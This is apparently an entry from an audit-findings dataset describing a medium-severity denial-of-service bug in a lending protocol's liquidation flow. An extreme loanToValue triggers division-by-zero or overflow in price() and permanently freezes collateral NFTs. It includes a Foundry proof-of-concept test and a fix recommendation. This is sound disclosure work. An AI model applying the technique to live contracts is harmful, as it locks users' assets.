# [M] Denial-of-Service in the liquidation flow re-

## Summary
Severity: Medium
Contest weight: 0.4621
Dataset id: 19871
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
If the loanTovalue value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever.
The platform allows users to sign offers and provide funds to those who need to borrow assets.
In the first scenario, the lender provided an offer that the loanTovalue as high as the result of the shareMatched is 0. For example, if the borrowed amount was 1e40 and the offer had a loanTovalue equal to 1e68, the share would be 0.
BorrowLogic/BorrowHandlers.sol#L47
As a result, an arithmetic error (Division or modulo by 0) will occur in the price() function at line 50 during the liquidation process.
AuctionFacet.sol#L34-L55
In the second scenario, if the lender's share exceeds 0, but the offer's loanToValue is extremely high, the price() function at line 54 may encounter an arithmetic error(Arithmetic over/underflow) during the estimatedValue calculation.
AuctionFacet.sol#L54
Proof of Concept
kairos-contracts/test/BorrowBorrow.t.sol
```solidity
function testBorrowOverflow() public {
    uint256 borrowAmount = 1e40;
    BorrowArg[] memory borrowArgs = new BorrowArg[](1);
    (, ,uint256 loanId , ) = kairos.getParameters();
    loanId += 1;
    Offer memory offer = Offer({
        assetToLend: money,
        loanToValue: 1e61,
        duration: 1,
        expirationDate: block.timestamp + 2 hours,
        tranche: 0,
        collateral: getNft()
    });
    uint256 currentTokenId;
    getFlooz(signer, money, getOfferArg(offer).amount);
    {
        OfferArg[] memory offerArgs = new OfferArg[](1);
        currentTokenId = getJpeg(BORROWER, nft);
        offer.collateral.id = currentTokenId;
        offerArgs[0] = OfferArg({
            signature: getSignature(offer),
            amount: borrowAmount,
            offer: offer
        });
        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});
    }
    vm.prank(BORROWER);
    kairos.borrow(borrowArgs);
    assertEq(nft.balanceOf(BORROWER), 0);
    assertEq(money.balanceOf(BORROWER), borrowAmount);
    assertEq(nft.balanceOf(address(kairos)), 1);
    vm.warp(block.timestamp + 1);
    Loan memory loan = kairos.getLoan(loanId);
    console.log("price of loanId", kairos.price(loanId));
}
```
The loan position will not be liquidated, which will result in the collateral NTF being permanently frozen in the contract.

## Recommendation
We recommend adding the mechanism during the borrowing process to restrict the maximum loanToValue limit and ensure that the lender's share is always greater than zero. This will prevent arithmetic errors.
